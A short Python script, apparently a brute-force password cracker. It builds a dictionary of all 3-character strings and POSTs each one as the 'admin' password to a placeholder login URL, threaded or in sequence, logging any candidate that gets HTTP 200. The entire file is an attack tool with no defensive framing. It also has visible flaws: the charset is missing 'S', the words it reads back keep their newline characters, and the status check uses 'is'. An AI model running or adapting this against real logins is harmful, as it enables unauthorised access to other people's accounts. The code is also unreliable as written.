#!/bin/env python3
from sys import argv, stdout
import requests
import os
import json
import time
import pandas as pd
import concurrent.futures

URL = "https://target"
CHARSET = "ABCDEFGHIJKLMNOPQRTUVWXYZ0123456789"
DICTIONARY="dictionary.txt"
LENGTH = 3
THREADS = 1
TIMEOUT = 5
VERBOSE = False

def allstrings(alphabet, length):
    c = []
    for i in range(length):
        c = [[x]+y for x in alphabet for y in c or [[]]]
    return c

def generate_dictionary():
    output_size = (len(CHARSET) ** LENGTH) * (LENGTH + 1)
    print("Generating dictionary...")
    print("Estimated output size: ")
    print("%s bytes // %s kB" %(output_size, output_size*0.000977))
    strings = allstrings(CHARSET, LENGTH)
    with open(DICTIONARY, 'a+') as f:
        for index, sublist in enumerate(strings):
            f.write("".join(sublist)+"\n")
            stdout.write("[%s/%s]\r" %(index, len(strings)))
            stdout.flush()
    print("Dictionary succesfully generated : %s" %DICTIONARY)

def check_password(word, index, size):
    stdout.write('[%s/%s]\r' %(index, size))
    stdout.flush()
    headers = {'User-agent': 'Mozilla/5.0'}
    data = {"user": "admin", "password": word}
    requestURL = URL
    try:
        r = requests.post(requestURL, data, headers=headers)
        if r.status_code is 200:
            with open('results.out','a+') as f:
                print('Found password: %s' %word, flush=True)
                f.write(word+'\n')
                f.close()
        else:
            pass
    except Exception as e:
        if VERBOSE:
            print(e, flush=True)
        pass

def brute(words):
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        tasks = (executor.submit(check_password, word, index, len(words)) for index, word in enumerate(words))
        time1 = time.time()
        for future in concurrent.futures.as_completed(tasks):
            try:
                future.result()
            except Exception as exc:
                print(exc, flush=True)
                pass
            finally:
                pass
        time2 = time.time()
    print(f'Took {time2-time1:.2f} s')

def brute_sync(words):
    for index, word in enumerate(words):
        check_password(word, index, len(words))
    
def main():
    if not os.path.isfile(DICTIONARY):
        generate_dictionary()
        print('You can now run this program again to start cracking')
    else:
        with open(DICTIONARY) as f:
            wordlist = f.readlines()
            if THREADS > 1:
                brute(wordlist)
            else:
                brute_sync(wordlist)

if __name__ == "__main__":
    exit(main())        

